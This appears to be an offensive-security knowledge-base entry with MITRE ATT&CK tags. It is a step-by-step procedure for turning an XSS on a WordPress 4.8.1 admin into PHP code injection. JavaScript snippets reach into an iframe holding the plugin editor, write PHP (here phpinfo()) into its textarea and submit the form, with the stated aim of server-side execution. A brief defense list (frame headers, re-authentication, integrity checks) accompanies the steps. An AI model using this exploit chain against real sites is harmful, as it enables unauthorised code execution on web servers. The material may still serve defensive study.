---
tags:
  - injection
  - php
  - iframe
  - dom
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/define-php-payload]]'
  - '[[commands/access-iframe-document]]'
  - '[[commands/select-newcontent-textarea]]'
  - '[[commands/select-submit-button]]'
  - '[[commands/set-textarea-value]]'
  - '[[commands/click-submit-button]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 9ab8cf74-2ecb-41d7-8d7c-bd22c7da9ebd
created_at: '2025-12-14T17:23:20.681Z'
updated_at: '2025-12-14T17:23:20.681Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Inject-PHP-Code-via-Iframe-Manipulation

## Summary

This procedure uses JavaScript to manipulate the loaded iframe's DOM, injecting PHP code into the plugin editor's textarea and submitting the form to save it to the target file.

## Description

After the iframe loads, the script accesses its contentWindow.document due to same-origin policy, targets the #newcontent textarea, sets it to malicious PHP like phpinfo(), and simulates a click on the #submit button. This automates file editing without re-authentication, exploiting the lack of CSRF or frame protections in WordPress 4.8.1.

## Requirements

1. XSS triggered and iframe loaded in admin context
2. Plugin editor page structure unchanged (e.g., #newcontent, #submit elements)
3. Write access to wp-content/plugins/hello.php

## Defense

Defensive measures and detection strategies:

- Add X-Frame-Options: DENY or SAMEORIGIN strictly
- Require re-authentication for file edits: Implement nonces or CAPTCHAs
- Monitor file changes: Use integrity checks on plugin files

## Objectives

1. Automate PHP injection via cross-frame scripting
2. Save malicious code to plugin without interaction
3. Escalate to server-side execution capability

## Instructions

### Step 1: Define Payload

**Context**: Set the PHP code to inject.

Execute [[commands/define-php-payload]]:

```javascript
var p = "<?php phpinfo(); ?>";
```

> Variable p holds the info-dumping code.

### Step 2: Access Iframe DOM

**Context**: Gain control over the editor page.

Execute [[commands/access-iframe-document]]:

```javascript
var d = document.querySelector("iframe").contentWindow.document;
```

> d references the iframe's document.

### Step 3: Target Elements

**Context**: Select textarea and button.

Execute [[commands/select-newcontent-textarea]] and [[commands/select-submit-button]]:

```javascript
var c = d.querySelector("#newcontent");
var s = d.querySelector("#submit");
```

> Elements c and s are ready for manipulation.

### Step 4: Inject and Submit

**Context**: Set value and trigger save.

Execute [[commands/set-textarea-value]] and [[commands/click-submit-button]]:

```javascript
c.value = p;
s.click();
```

> File updated with PHP code, form submits silently.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/define-php-payload]]
- [[commands/access-iframe-document]]
- [[commands/select-newcontent-textarea]]
- [[commands/select-submit-button]]
- [[commands/set-textarea-value]]
- [[commands/click-submit-button]]

## Tools Used


## Tags

- [[dom-manipulation]]
- [[code-injection]]
